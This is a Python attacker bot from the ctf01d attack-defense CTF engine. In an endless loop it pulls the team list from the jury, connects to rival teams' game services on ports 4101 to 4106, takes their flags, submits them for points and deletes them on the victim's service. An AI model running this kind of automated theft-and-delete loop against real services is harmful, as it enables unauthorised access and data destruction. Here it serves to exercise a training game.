#!/usr/bin/env python3
##################################################################################
#           Project
#   _______ _________ _______  _______  __    ______
#  (  ____ \\__   __/(  ____ \(  __   )/  \  (  __  \
#  | (    \/   ) (   | (    \/| (  )  |\/) ) | (  \  )
#  | |         | |   | (__    | | /   |  | | | |   ) |
#  | |         | |   |  __)   | (/ /) |  | | | |   | |
#  | |         | |   | (      |   / | |  | | | |   ) |
#  | (____/\   | |   | )      |  (__) |__) (_| (__/  )
#  (_______/   )_(   |/       (_______)\____/(______/
#
# MIT License
#
# Copyright (c) 2018-2026 Evgenii Sopov
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Original repository: https://github.com/sea5kg/ctf01d
#
##################################################################################

"""
Auto detect subnetwork and start attack in infinite while
"""

import socket
import os
import sys
import json
import time
import traceback
import requests

if len(sys.argv) < 2:
    sys.exit("Expected parameter <jury_host> like 10.10.100.101:8080")

JURY_HOST = sys.argv[1]
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
FLAGS_DIR = os.path.join(SCRIPT_DIR, 'flags')


def get_my_ip():
    """ request jury api """
    url = 'http://' + JURY_HOST + '/api/v1/myip'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()["myip"]
    except Exception as err:  # pylint: disable=broad-except
        print("get_my_ip, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def get_teams():
    """ request jury api """
    url = 'http://' + JURY_HOST + '/api/v1/teams'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()['teams']
    except Exception as err:  # pylint: disable=broad-except
        print("get_teams, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def get_scoreboard():
    """ request jury api """
    url = 'http://' + JURY_HOST + '/api/v1/scoreboard'
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception as err:  # pylint: disable=broad-except
        print("get_scoreboard, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def send_flag(your_teamnum, flag):
    """ request jury api """
    url = 'http://' + JURY_HOST + '/flag'
    url += '?teamid=' + str(your_teamnum)
    url += '&flag=' + flag
    try:
        resp = requests.get(url, timeout=5)
        print("Try send flag " + flag)
        ret = "?"
        if resp.status_code != 200:
            ret = "FAIL " + resp.text
        else:
            ret = "OK " + resp.text
        print(ret)
        return ret
    except Exception as err:  # pylint: disable=broad-except
        print("send_flag, Could not connect to jury " + url, str(err))
        print(traceback.format_exc())
    return None


def delete_flag(ip_address, port, flag_id):
    """ request service api """
    try:
        # print("try connect " + host + ":" + str(port))
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(1)
        _socket.connect((ip_address, port))
        _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("delete\n".encode())
        _socket.recv(1024).decode("utf-8")
        _socket.send(str(flag_id + "\n").encode())
        _socket.recv(1024).decode("utf-8")
        _socket.close()
    except socket.timeout:
        print("delete_flag, socket.timeout")
    except socket.error as serr:
        print("delete_flag", str(serr))
    except Exception as err:  # pylint: disable=broad-except
        print("delete_flag", str(err))
        print(traceback.format_exc())
    return ''


def get_flag(ip_address, port, flag_id):
    """ request service api """
    try:
        # print("try connect " + host + ":" + str(port))
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(1)
        _socket.connect((ip_address, port))
        result = _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("get\n".encode())
        result = _socket.recv(1024).decode("utf-8")
        _socket.send(str(flag_id + "\n").encode())
        result = _socket.recv(1024).decode("utf-8")
        flag2 = result.strip()
        flag2 = flag2.split("FOUND FLAG: ")
        if len(flag2) == 2:
            flag2 = flag2[1]
        else:
            flag2 = ''
        _socket.close()
        return flag2
    except socket.timeout:
        print("get_flag, socket.timeout")
    except socket.error as _err:
        print("get_flag,", str(_err))
    except Exception as err:  # pylint: disable=broad-except
        print("get_flag,", str(err))
        print(traceback.format_exc())
    return ''


def get_list_flag_ids(ip_address, port):
    """ request service api """
    flag_ids = []
    try:
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(0.2)
        _socket.connect((ip_address, port))
        result = _socket.recv(1024).decode("utf-8")
        # print(result)
        _socket.send("list\n".encode())
        result = ""
        result1 = _socket.recv(1024).decode("utf-8")
        while result1.strip() != "":
            result1 = _socket.recv(1024).decode("utf-8")
            if result1.strip() == "":
                break
            result = result + result1
        _socket.close()

        result = result.split('\n')
        for i in result:
            if i == '':
                continue
            flag_id = i.split(":")[1].strip()
            flag_ids.append(flag_id)
    except socket.timeout:
        print("get_list_flag_ids, Socket timeout")
    except socket.error as _err:
        print("get_list_flag_ids, socket.error", _err)
    except Exception as err:  # pylint: disable=broad-except
        print("get_list_flag_ids, Exception", str(err))
        print(traceback.format_exc())
    return flag_ids


def start_exploit(your_team_num, ip_address, port):
    """ start exploit to specific service """
    # print("Start attack to (" + ip_address + ":" + str(port) + ")")
    flag_ids = get_list_flag_ids(ip_address, port)

    prev_flags = {}
    if not os.path.isdir(FLAGS_DIR):
        os.mkdir(FLAGS_DIR)
    filename = os.path.join(FLAGS_DIR, "found_flags.json")
    if os.path.isfile(filename):
        with open(filename, "r") as _file:
            prev_flags = json.load(_file)

    for flag_id in flag_ids:
        flag = get_flag(ip_address, port, flag_id)
        if flag in prev_flags:
            continue
        print(flag_id + ": " + flag)
        if flag != '':
            ret = send_flag(your_team_num, flag)
            if ret is not None:
                prev_flags[flag] = ret
                delete_flag(ip_address, port, flag_id)

    with open(filename, 'w', encoding='utf-8') as _file:
        json.dump(prev_flags, _file, ensure_ascii=False, indent=4)


SERVICES_PORTS = {
    'service1': 4101,
    'service2': 4102,
    'service3': 4103,
    'service4': 4104,
    'service5': 4105,
    'service6': 4106,
}

while True:
    # print("get list of teams")
    teams = get_teams()
    if teams is None:
        time.sleep(5)
        continue

    my_ip = get_my_ip()
    SUBNETWORK = ".".join(my_ip.split(".")[:-1]) + "."
    # print("my ip = ", my_ip)
    # print("my subnetwork = " + SUBNETWORK + "0/24")

    FOUND_TEAM = None
    found_teams = []
    for team in teams:
        # print(team['ip_address'])
        if team['ip_address'].startswith(SUBNETWORK):
            found_teams.append(team)

    if len(found_teams) == 1:
        # print("Found team by subnetwork")
        FOUND_TEAM = found_teams[0]
    else:
        for team in found_teams:
            if team['ip_address'] == my_ip:
                # print("Found team by ip")
                FOUND_TEAM = team

    if not FOUND_TEAM:
        print("ERROR: Could not detect team number - please hardcode (" + my_ip + ")")
        time.sleep(5)
        continue

    my_team_id = FOUND_TEAM['id']

    # print("your team is " + my_team_id)
    scoreboard = get_scoreboard()
    if scoreboard is None:
        time.sleep(5)
        continue

    ATTACKED_SERVICES = 0
    for team in teams:
        # print(team)
        team_id = team['id']
        team_name = team['name']
        team_ip_address = team['ip_address']
        team_scoreboard = scoreboard['scoreboard'][team_id]['ts_sta']
        # print(team_scoreboard.keys())

        if team_id != my_team_id:
            for service_id in team_scoreboard:
                service_port = SERVICES_PORTS[service_id]
                service_info = team_scoreboard[service_id]
                # print(service_info)
                if service_info['status'] != 'down':
                    ATTACKED_SERVICES += 1
                    start_exploit(my_team_id, team_ip_address, service_port)
    if ATTACKED_SERVICES < 6:
        time.sleep(10)
